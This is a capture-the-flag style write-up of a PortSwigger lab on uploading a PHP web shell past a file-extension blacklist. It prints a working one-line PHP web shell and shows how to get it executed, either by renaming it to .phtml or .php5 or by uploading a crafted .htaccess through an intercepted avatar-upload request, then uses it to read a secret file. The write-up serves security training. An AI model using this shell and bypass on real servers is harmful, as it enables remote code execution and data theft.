# Web shell upload via extension blacklist bypass

### Goal - 

To solve the lab, upload a basic PHP web shell and use it to exfiltrate the contents of the file `/home/carlos/secret`

### Analysis/Exploitation -

[Solution  (the easy and unintended way)](https://app.notion.com/p/8133e72ab08a41068a99f5712ad2385b#7008774cb9ca462e9cd076d4095ef174) 

Login as user `wiener`:

In the account settings, I can set both an email address and an avatar image for the user.

upload the PHP script  
`<?php system($_GET['cmd']); ?>`

Trying to upload the php script shows that PHP files are not allowed to upload:

![](https://prod-files-secure.s3.us-west-2.amazonaws.com/b2aeba79-db56-4c12-b5d6-e1ce387d4f27/6255eea3-0949-47c4-84bd-c5ea9289511b/Untitled.png?X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Content-Sha256=UNSIGNED-PAYLOAD&X-Amz-Credential=ASIAZI2LB466ZSB2L3EE%2F20260821%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20260821T221949Z&X-Amz-Expires=3600&X-Amz-Security-Token=IQoJb3JpZ2luX2VjEOb%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJGMEQCICupKpTJ7R%2Bi%2B%2BCrORPuFS%2BK%2FPdrCibaT%2F9i8ISpeQzeAiB07ud%2FqUjafPo80VhCfXUT3Ocp3kZu1SGTW2hDoDVQ%2BSqIBAiv%2F%2F%2F%2F%2F%2F%2F%2F%2F%2F8BEAAaDDYzNzQyMzE4MzgwNSIMyefiXOgj66f7j3xHKtwDZCqy6CgB1iqMDTWHZM%2FqbWHmP1ja3P0EjQm9P3JKW9vEMZj6ODA6OHlO5q9ICyF5gn%2Bw6bJDPsGVxipmt7t103ecOABt0PAQjSZvQnJO7MlHkD6HthDEQHkLUponIp7P81xg9GYGaFGDLgZqkHMx6TFANKE6igS840dNW98Pg1XtuP09PpjudCMrb7BolIktUgg5MMRozskXscZWmdJnxn0Uer%2BHmsWHeo%2B8PVdNox3bBVo1SsosSB6Hi%2FAer9W8n%2FAH3KhQJ10QofuIgyqaj2OVfrAzutqR35QS8sTCgSPQRiWTGhfncrWAbJAWnjoVoOWrbmdSPHTk6nVSAYT4e%2FG42wkDTUdR65G6yJRo7CPbY%2BdM%2Fnesrn41A8s5PwtS%2FH2mLYhD5UNQofy4QGjiHlu%2BodEJ%2BFj3vtwWc0pI2lU6uZ6hdnNtaAvw7%2BMhnBRXTM98UEyUs8WCUNqqqT7ol3ihwvss%2FmEDhwN%2B786N91fAmdqV1GQLCo8%2FuW90xhOKpUrxDEDbcb%2F9AJbeGlIuPUNy9Md4HXqIWkUQjg9GcA3yo9Vki3OOCBhS%2FOsH8bTgkp2n%2FrrIORt6xSe65bZWFiQWzRrwlJ%2BIRLsNztxMX%2FrzcSbWb4yHZtzjQC0w9IWj1AY6pgG23wv0z%2BbDiOz8WGSTb%2FBVIp6C4uyKeOTMUT48JKwG1DMR7eUzf%2FxKHEyYSG2mi7ERoBP9hEy2tKpgJPv08XSLX1CsVT9csP%2B%2BeN%2BavKtOkiJ4HLp4Ypw%2B3GyXBhSW6v10M9fdK405akvb72s02FTeAjNttv7EdfBfxFxHmK6VdmU94s0BBymxrlTSDahhri6mEzR74rzg1LvN%2Fk%2BPAV3rJ14wy2QR&X-Amz-Signature=f5de40119b38fe8b94c764806d9855ea612fedef1a2d2d1efa6dc599d0cc8d5b&X-Amz-SignedHeaders=host&x-amz-checksum-mode=ENABLED&x-id=GetObject)

No file with a PHP extension can be uploaded on the server. Attempts to circumvent this with different capitalization `shell.pHP` or null bytes in the filename `shell.php%00.png` showed no success.

The next step was to try some common alternative extensions for PHP files. The [hacktricks.xyz](https://book.hacktricks.xyz/pentesting-web/file-upload) list a couple of such alternatives for PHP: `phtml, .php, .php3, .php4, .php5`

To bypass this, we can rename the file extension to `.php5`. This extension tells the web server to use PHP version 5.

![](https://prod-files-secure.s3.us-west-2.amazonaws.com/b2aeba79-db56-4c12-b5d6-e1ce387d4f27/7db30d74-5e6c-4e48-a2c6-385808857d7d/2024-03-01_07-57.png?X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Content-Sha256=UNSIGNED-PAYLOAD&X-Amz-Credential=ASIAZI2LB466ZSB2L3EE%2F20260821%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20260821T221949Z&X-Amz-Expires=3600&X-Amz-Security-Token=IQoJb3JpZ2luX2VjEOb%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJGMEQCICupKpTJ7R%2Bi%2B%2BCrORPuFS%2BK%2FPdrCibaT%2F9i8ISpeQzeAiB07ud%2FqUjafPo80VhCfXUT3Ocp3kZu1SGTW2hDoDVQ%2BSqIBAiv%2F%2F%2F%2F%2F%2F%2F%2F%2F%2F8BEAAaDDYzNzQyMzE4MzgwNSIMyefiXOgj66f7j3xHKtwDZCqy6CgB1iqMDTWHZM%2FqbWHmP1ja3P0EjQm9P3JKW9vEMZj6ODA6OHlO5q9ICyF5gn%2Bw6bJDPsGVxipmt7t103ecOABt0PAQjSZvQnJO7MlHkD6HthDEQHkLUponIp7P81xg9GYGaFGDLgZqkHMx6TFANKE6igS840dNW98Pg1XtuP09PpjudCMrb7BolIktUgg5MMRozskXscZWmdJnxn0Uer%2BHmsWHeo%2B8PVdNox3bBVo1SsosSB6Hi%2FAer9W8n%2FAH3KhQJ10QofuIgyqaj2OVfrAzutqR35QS8sTCgSPQRiWTGhfncrWAbJAWnjoVoOWrbmdSPHTk6nVSAYT4e%2FG42wkDTUdR65G6yJRo7CPbY%2BdM%2Fnesrn41A8s5PwtS%2FH2mLYhD5UNQofy4QGjiHlu%2BodEJ%2BFj3vtwWc0pI2lU6uZ6hdnNtaAvw7%2BMhnBRXTM98UEyUs8WCUNqqqT7ol3ihwvss%2FmEDhwN%2B786N91fAmdqV1GQLCo8%2FuW90xhOKpUrxDEDbcb%2F9AJbeGlIuPUNy9Md4HXqIWkUQjg9GcA3yo9Vki3OOCBhS%2FOsH8bTgkp2n%2FrrIORt6xSe65bZWFiQWzRrwlJ%2BIRLsNztxMX%2FrzcSbWb4yHZtzjQC0w9IWj1AY6pgG23wv0z%2BbDiOz8WGSTb%2FBVIp6C4uyKeOTMUT48JKwG1DMR7eUzf%2FxKHEyYSG2mi7ERoBP9hEy2tKpgJPv08XSLX1CsVT9csP%2B%2BeN%2BavKtOkiJ4HLp4Ypw%2B3GyXBhSW6v10M9fdK405akvb72s02FTeAjNttv7EdfBfxFxHmK6VdmU94s0BBymxrlTSDahhri6mEzR74rzg1LvN%2Fk%2BPAV3rJ14wy2QR&X-Amz-Signature=6deb8778e9c105a9f3c9e7cfd5f59dda40c9b6c4143d20157cb50e9a0672284e&X-Amz-SignedHeaders=host&x-amz-checksum-mode=ENABLED&x-id=GetObject)

We’ve successfully uploaded the web shell!

**Check Can we execute any command?**

![](https://prod-files-secure.s3.us-west-2.amazonaws.com/b2aeba79-db56-4c12-b5d6-e1ce387d4f27/9d20721b-088c-465c-855d-c047a2298ef0/Untitled.png?X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Content-Sha256=UNSIGNED-PAYLOAD&X-Amz-Credential=ASIAZI2LB466ZSB2L3EE%2F20260821%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20260821T221949Z&X-Amz-Expires=3600&X-Amz-Security-Token=IQoJb3JpZ2luX2VjEOb%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJGMEQCICupKpTJ7R%2Bi%2B%2BCrORPuFS%2BK%2FPdrCibaT%2F9i8ISpeQzeAiB07ud%2FqUjafPo80VhCfXUT3Ocp3kZu1SGTW2hDoDVQ%2BSqIBAiv%2F%2F%2F%2F%2F%2F%2F%2F%2F%2F8BEAAaDDYzNzQyMzE4MzgwNSIMyefiXOgj66f7j3xHKtwDZCqy6CgB1iqMDTWHZM%2FqbWHmP1ja3P0EjQm9P3JKW9vEMZj6ODA6OHlO5q9ICyF5gn%2Bw6bJDPsGVxipmt7t103ecOABt0PAQjSZvQnJO7MlHkD6HthDEQHkLUponIp7P81xg9GYGaFGDLgZqkHMx6TFANKE6igS840dNW98Pg1XtuP09PpjudCMrb7BolIktUgg5MMRozskXscZWmdJnxn0Uer%2BHmsWHeo%2B8PVdNox3bBVo1SsosSB6Hi%2FAer9W8n%2FAH3KhQJ10QofuIgyqaj2OVfrAzutqR35QS8sTCgSPQRiWTGhfncrWAbJAWnjoVoOWrbmdSPHTk6nVSAYT4e%2FG42wkDTUdR65G6yJRo7CPbY%2BdM%2Fnesrn41A8s5PwtS%2FH2mLYhD5UNQofy4QGjiHlu%2BodEJ%2BFj3vtwWc0pI2lU6uZ6hdnNtaAvw7%2BMhnBRXTM98UEyUs8WCUNqqqT7ol3ihwvss%2FmEDhwN%2B786N91fAmdqV1GQLCo8%2FuW90xhOKpUrxDEDbcb%2F9AJbeGlIuPUNy9Md4HXqIWkUQjg9GcA3yo9Vki3OOCBhS%2FOsH8bTgkp2n%2FrrIORt6xSe65bZWFiQWzRrwlJ%2BIRLsNztxMX%2FrzcSbWb4yHZtzjQC0w9IWj1AY6pgG23wv0z%2BbDiOz8WGSTb%2FBVIp6C4uyKeOTMUT48JKwG1DMR7eUzf%2FxKHEyYSG2mi7ERoBP9hEy2tKpgJPv08XSLX1CsVT9csP%2B%2BeN%2BavKtOkiJ4HLp4Ypw%2B3GyXBhSW6v10M9fdK405akvb72s02FTeAjNttv7EdfBfxFxHmK6VdmU94s0BBymxrlTSDahhri6mEzR74rzg1LvN%2Fk%2BPAV3rJ14wy2QR&X-Amz-Signature=97acc93e5cc0b7b5f5a315505f2e1fdf1d66ad977fd3428decdb7ddb07a058e6&X-Amz-SignedHeaders=host&x-amz-checksum-mode=ENABLED&x-id=GetObject)

Nope we get plain text of webShell we uploaded.This might happen is because **servers typically won’t execute files unless they have been configured to do so.**

In FireFox extension `Wappalyzer`, it will tell us which web server is using:

![](https://raw.githubusercontent.com/siunam321/CTF-Writeups/main/Portswigger-Labs/File-Upload-Vulnerabilities/FUV-4/images/Pasted%20image%2020221216012534.png)

In this case, **the web server is using **`Apache`**.**

> 💡 **In Apache server, before executing PHP files requested by a client, developers might have to add the following directives to their **`/etc/apache2/apache2.conf`** file:**

```text
LoadModule php_module /usr/lib/apache2/modules/libphp.so
AddType application/x-httpd-php .php
```

Many servers also allow developers to create special configuration files within individual directories in order to override or add to one or more of the global settings.

In Apache servers, it will load a directory-specific configuration from a file called `.htaccess` if one is present.

Now, what if I upload a file called `.htaccess` to override the server configuration?

**After poking around, I found this **[**Medium blog**](https://asreshashank.medium.com/execute-php-scripts-into-html-file-by-modifying-htaccess-file-8517ed1e2066)**:**

![](https://raw.githubusercontent.com/siunam321/CTF-Writeups/main/Portswigger-Labs/File-Upload-Vulnerabilities/FUV-4/images/Pasted%20image%2020221216013635.png)

we can create our own `.htaccess` with the following configuration:

> `AddType application/x-httpd-php .php5`

**By doing that, we can execute any file that has **`.php5`** extension!**

while uploading intercept the request and **Change the **`Content-Type`** to **`text/plain`**:**

![](https://prod-files-secure.s3.us-west-2.amazonaws.com/b2aeba79-db56-4c12-b5d6-e1ce387d4f27/7da44160-911a-4b1a-9d8a-08b467fa0cc0/Untitled.png?X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Content-Sha256=UNSIGNED-PAYLOAD&X-Amz-Credential=ASIAZI2LB466ZSB2L3EE%2F20260821%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20260821T221949Z&X-Amz-Expires=3600&X-Amz-Security-Token=IQoJb3JpZ2luX2VjEOb%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJGMEQCICupKpTJ7R%2Bi%2B%2BCrORPuFS%2BK%2FPdrCibaT%2F9i8ISpeQzeAiB07ud%2FqUjafPo80VhCfXUT3Ocp3kZu1SGTW2hDoDVQ%2BSqIBAiv%2F%2F%2F%2F%2F%2F%2F%2F%2F%2F8BEAAaDDYzNzQyMzE4MzgwNSIMyefiXOgj66f7j3xHKtwDZCqy6CgB1iqMDTWHZM%2FqbWHmP1ja3P0EjQm9P3JKW9vEMZj6ODA6OHlO5q9ICyF5gn%2Bw6bJDPsGVxipmt7t103ecOABt0PAQjSZvQnJO7MlHkD6HthDEQHkLUponIp7P81xg9GYGaFGDLgZqkHMx6TFANKE6igS840dNW98Pg1XtuP09PpjudCMrb7BolIktUgg5MMRozskXscZWmdJnxn0Uer%2BHmsWHeo%2B8PVdNox3bBVo1SsosSB6Hi%2FAer9W8n%2FAH3KhQJ10QofuIgyqaj2OVfrAzutqR35QS8sTCgSPQRiWTGhfncrWAbJAWnjoVoOWrbmdSPHTk6nVSAYT4e%2FG42wkDTUdR65G6yJRo7CPbY%2BdM%2Fnesrn41A8s5PwtS%2FH2mLYhD5UNQofy4QGjiHlu%2BodEJ%2BFj3vtwWc0pI2lU6uZ6hdnNtaAvw7%2BMhnBRXTM98UEyUs8WCUNqqqT7ol3ihwvss%2FmEDhwN%2B786N91fAmdqV1GQLCo8%2FuW90xhOKpUrxDEDbcb%2F9AJbeGlIuPUNy9Md4HXqIWkUQjg9GcA3yo9Vki3OOCBhS%2FOsH8bTgkp2n%2FrrIORt6xSe65bZWFiQWzRrwlJ%2BIRLsNztxMX%2FrzcSbWb4yHZtzjQC0w9IWj1AY6pgG23wv0z%2BbDiOz8WGSTb%2FBVIp6C4uyKeOTMUT48JKwG1DMR7eUzf%2FxKHEyYSG2mi7ERoBP9hEy2tKpgJPv08XSLX1CsVT9csP%2B%2BeN%2BavKtOkiJ4HLp4Ypw%2B3GyXBhSW6v10M9fdK405akvb72s02FTeAjNttv7EdfBfxFxHmK6VdmU94s0BBymxrlTSDahhri6mEzR74rzg1LvN%2Fk%2BPAV3rJ14wy2QR&X-Amz-Signature=20a735b300f326a2fa73304cda84580fe938e54904fb304489e1534fb258444e&X-Amz-SignedHeaders=host&x-amz-checksum-mode=ENABLED&x-id=GetObject)

Or it can be directly uploaded from Burp Repeater, by sending  `POST /my-account/avatar` request that was used to submit the file upload.Make the following changes:

- Change the value of the `filename` parameter to `.htaccess`.
- Change the value of the `Content-Type` header to `text/plain`.
- Replace the contents of the file (your PHP payload) with the following Apache directive: `AddType application/x-httpd-php .php5`

> 💡 I noticed that I was able to upload a number of different file extension, possibly even arbitrary ones like `.a2z, .abc` .

If reusing an upload request of `png` or `php` files for the Repeater it is important to set the Content-Type to `text/plain`. Otherwise, the server will return a `500 Internal Server error` when trying to load something later on.

The application is served by an apache server, so uploading a custom .htaccess file maps an arbitrary extension (`.a2z`) to the executable MIME type `application/x-httpd-php`. As the server uses the `mod_php` module, it knows how to handle this already.

now we can execute command                                             

![](https://prod-files-secure.s3.us-west-2.amazonaws.com/b2aeba79-db56-4c12-b5d6-e1ce387d4f27/d35ddc09-b43d-40d8-a145-c24c4978f3d5/Untitled.png?X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Content-Sha256=UNSIGNED-PAYLOAD&X-Amz-Credential=ASIAZI2LB466ZSB2L3EE%2F20260821%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20260821T221949Z&X-Amz-Expires=3600&X-Amz-Security-Token=IQoJb3JpZ2luX2VjEOb%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJGMEQCICupKpTJ7R%2Bi%2B%2BCrORPuFS%2BK%2FPdrCibaT%2F9i8ISpeQzeAiB07ud%2FqUjafPo80VhCfXUT3Ocp3kZu1SGTW2hDoDVQ%2BSqIBAiv%2F%2F%2F%2F%2F%2F%2F%2F%2F%2F8BEAAaDDYzNzQyMzE4MzgwNSIMyefiXOgj66f7j3xHKtwDZCqy6CgB1iqMDTWHZM%2FqbWHmP1ja3P0EjQm9P3JKW9vEMZj6ODA6OHlO5q9ICyF5gn%2Bw6bJDPsGVxipmt7t103ecOABt0PAQjSZvQnJO7MlHkD6HthDEQHkLUponIp7P81xg9GYGaFGDLgZqkHMx6TFANKE6igS840dNW98Pg1XtuP09PpjudCMrb7BolIktUgg5MMRozskXscZWmdJnxn0Uer%2BHmsWHeo%2B8PVdNox3bBVo1SsosSB6Hi%2FAer9W8n%2FAH3KhQJ10QofuIgyqaj2OVfrAzutqR35QS8sTCgSPQRiWTGhfncrWAbJAWnjoVoOWrbmdSPHTk6nVSAYT4e%2FG42wkDTUdR65G6yJRo7CPbY%2BdM%2Fnesrn41A8s5PwtS%2FH2mLYhD5UNQofy4QGjiHlu%2BodEJ%2BFj3vtwWc0pI2lU6uZ6hdnNtaAvw7%2BMhnBRXTM98UEyUs8WCUNqqqT7ol3ihwvss%2FmEDhwN%2B786N91fAmdqV1GQLCo8%2FuW90xhOKpUrxDEDbcb%2F9AJbeGlIuPUNy9Md4HXqIWkUQjg9GcA3yo9Vki3OOCBhS%2FOsH8bTgkp2n%2FrrIORt6xSe65bZWFiQWzRrwlJ%2BIRLsNztxMX%2FrzcSbWb4yHZtzjQC0w9IWj1AY6pgG23wv0z%2BbDiOz8WGSTb%2FBVIp6C4uyKeOTMUT48JKwG1DMR7eUzf%2FxKHEyYSG2mi7ERoBP9hEy2tKpgJPv08XSLX1CsVT9csP%2B%2BeN%2BavKtOkiJ4HLp4Ypw%2B3GyXBhSW6v10M9fdK405akvb72s02FTeAjNttv7EdfBfxFxHmK6VdmU94s0BBymxrlTSDahhri6mEzR74rzg1LvN%2Fk%2BPAV3rJ14wy2QR&X-Amz-Signature=d94935c10be726e35a940cb5429cbb127aed1791626634053c2a01b77b8f1ded&X-Amz-SignedHeaders=host&x-amz-checksum-mode=ENABLED&x-id=GetObject)

Fetch the carlos secret

![](https://prod-files-secure.s3.us-west-2.amazonaws.com/b2aeba79-db56-4c12-b5d6-e1ce387d4f27/73346238-3276-4754-9349-8bd022136e88/Untitled.png?X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Content-Sha256=UNSIGNED-PAYLOAD&X-Amz-Credential=ASIAZI2LB466ZSB2L3EE%2F20260821%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20260821T221949Z&X-Amz-Expires=3600&X-Amz-Security-Token=IQoJb3JpZ2luX2VjEOb%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJGMEQCICupKpTJ7R%2Bi%2B%2BCrORPuFS%2BK%2FPdrCibaT%2F9i8ISpeQzeAiB07ud%2FqUjafPo80VhCfXUT3Ocp3kZu1SGTW2hDoDVQ%2BSqIBAiv%2F%2F%2F%2F%2F%2F%2F%2F%2F%2F8BEAAaDDYzNzQyMzE4MzgwNSIMyefiXOgj66f7j3xHKtwDZCqy6CgB1iqMDTWHZM%2FqbWHmP1ja3P0EjQm9P3JKW9vEMZj6ODA6OHlO5q9ICyF5gn%2Bw6bJDPsGVxipmt7t103ecOABt0PAQjSZvQnJO7MlHkD6HthDEQHkLUponIp7P81xg9GYGaFGDLgZqkHMx6TFANKE6igS840dNW98Pg1XtuP09PpjudCMrb7BolIktUgg5MMRozskXscZWmdJnxn0Uer%2BHmsWHeo%2B8PVdNox3bBVo1SsosSB6Hi%2FAer9W8n%2FAH3KhQJ10QofuIgyqaj2OVfrAzutqR35QS8sTCgSPQRiWTGhfncrWAbJAWnjoVoOWrbmdSPHTk6nVSAYT4e%2FG42wkDTUdR65G6yJRo7CPbY%2BdM%2Fnesrn41A8s5PwtS%2FH2mLYhD5UNQofy4QGjiHlu%2BodEJ%2BFj3vtwWc0pI2lU6uZ6hdnNtaAvw7%2BMhnBRXTM98UEyUs8WCUNqqqT7ol3ihwvss%2FmEDhwN%2B786N91fAmdqV1GQLCo8%2FuW90xhOKpUrxDEDbcb%2F9AJbeGlIuPUNy9Md4HXqIWkUQjg9GcA3yo9Vki3OOCBhS%2FOsH8bTgkp2n%2FrrIORt6xSe65bZWFiQWzRrwlJ%2BIRLsNztxMX%2FrzcSbWb4yHZtzjQC0w9IWj1AY6pgG23wv0z%2BbDiOz8WGSTb%2FBVIp6C4uyKeOTMUT48JKwG1DMR7eUzf%2FxKHEyYSG2mi7ERoBP9hEy2tKpgJPv08XSLX1CsVT9csP%2B%2BeN%2BavKtOkiJ4HLp4Ypw%2B3GyXBhSW6v10M9fdK405akvb72s02FTeAjNttv7EdfBfxFxHmK6VdmU94s0BBymxrlTSDahhri6mEzR74rzg1LvN%2Fk%2BPAV3rJ14wy2QR&X-Amz-Signature=8c4a3d08b93b9daf5d3d82c4ba325946bc47aeea4fb7dd8fff1e4f2436b849b4&X-Amz-SignedHeaders=host&x-amz-checksum-mode=ENABLED&x-id=GetObject)

### **Solution  (the easy and unintended way)**

While the extensions with numbers at the end uploaded successful, they were not executed by the server. Uploading and accessing the file as `.phtml` is a different story and executes the script:

![](https://github.com/frank-leitner/portswigger-websecurity-academy/raw/main/08_file_upload_vulnerabilities/Web_shell_upload_via_extension_blacklist_bypass/img/phtml_solution.png)
